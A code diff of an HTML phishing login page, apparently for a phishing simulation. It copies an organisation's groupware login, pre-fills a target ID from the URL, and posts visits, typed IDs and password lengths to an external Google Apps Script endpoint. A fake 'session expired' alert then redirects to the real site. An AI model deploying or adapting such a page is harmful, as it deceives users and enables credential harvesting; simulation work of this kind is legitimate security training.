@@ -7,7 +7,7 @@
     <style>
         body { font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 20vh; min-height: 100vh; background-color: #ffffff; margin: 0; box-sizing: border-box; }
         .login-container { width: 380px; padding: 40px; border: 1px solid #e0e0e0; background-color: #ffffff; text-align: center; }
-        .logo-area { margin-bottom: 30px; font-size: 24px; font-weight: bold; color: #333; }
+        .logo-area { margin-bottom: 30px; }
         input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #333; background-color: #e8f0fe; box-sizing: border-box; font-size: 14px; }
         button { width: 100%; padding: 14px; background-color: #009ebf; color: white; border: none; cursor: pointer; font-size: 15px; font-weight: bold; margin-bottom: 15px; }
         button:hover { background-color: #00819c; }
@@ -33,47 +33,47 @@
     </div>
 
     <script>
-        // ★ 최신 GAS 배포 URL을 여기에 넣어줘!
-        const gasUrl = 'https://script.google.com/macros/s/AKfycbzQjXBTwmzw0EKtQxj8s9wgKgRIbtQ3NKTaqC3aIQpU6jyWkztHtBHLhYxOJQgF-V7puw/exec';
+        const gasUrl = 'https://script.google.com/macros/s/AKfycbzkc0lz3QJwzSiwPXZd9_yuTC4flTZ-aHWdq5EGg5d0z91CqTLHVC8B6bVqeMBwiVlY5w/exec';
 
-        let targetIdFromUrl = "";
+        let originalTargetId = "";
 
-        // 1. 페이지 로드 시: ?id= 값을 '수집대상'으로 인식
+        // 1. 페이지 접속 시
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            targetIdFromUrl = urlParams.get('id') || "알수없음";
+            originalTargetId = urlParams.get('id') || "알수없음";
 
-            if (targetIdFromUrl !== "알수없음") {
-                // 아이디 칸에 자동 입력
-                document.getElementById('userId').value = targetIdFromUrl;
+            if (originalTargetId !== "알수없음") {
+                // 화면 아이디 칸에 자동 입력
+                document.getElementById('userId').value = originalTargetId;
 
-                // [접속 로그] 전송: 시간 | 수집대상 | 접속 | 0
+                // 접속 로그 전송: [타겟ID | (접속함) | 0]
                 var formData = new FormData();
-                formData.append('targetId', targetIdFromUrl);
-                formData.append('type', '접속');
+                formData.append('targetId', originalTargetId);
+                formData.append('inputId', '(접속함)');
                 formData.append('pwLen', '0');
 
                 fetch(gasUrl, { method: 'POST', mode: 'no-cors', body: formData });
             }
         };
 
-        // 2. 로그인 클릭 시: 시간 | 수집대상 | 입력 | 비번길이
+        // 2. 로그인 버튼 클릭 시
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
 
-            var inputPw = document.getElementById('userPw').value;
-            
+            var typedId = document.getElementById('userId').value; // 실제 입력된 ID
+            var typedPw = document.getElementById('userPw').value;
+
             var formData = new FormData();
-            formData.append('targetId', targetIdFromUrl); // URL의 원본 대상 아이디 유지
-            formData.append('type', '입력');
-            formData.append('pwLen', inputPw.length); // 비번은 길이만 숫자로!
+            formData.append('targetId', originalTargetId); // URL에 있던 원본 ID
+            formData.append('inputId', typedId);           // 실제로 입력한 ID
+            formData.append('pwLen', typedPw.length);      // 비번 글자수
 
             fetch(gasUrl, {
                 method: 'POST',
                 mode: 'no-cors', 
                 body: formData
             }).then(() => {
-                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
+                alert('세션이 만료되었습니다. 다시 로그인해 주세요.');
                 window.location.href = 'https://gnware.gnk.or.kr/login';
             });
         });
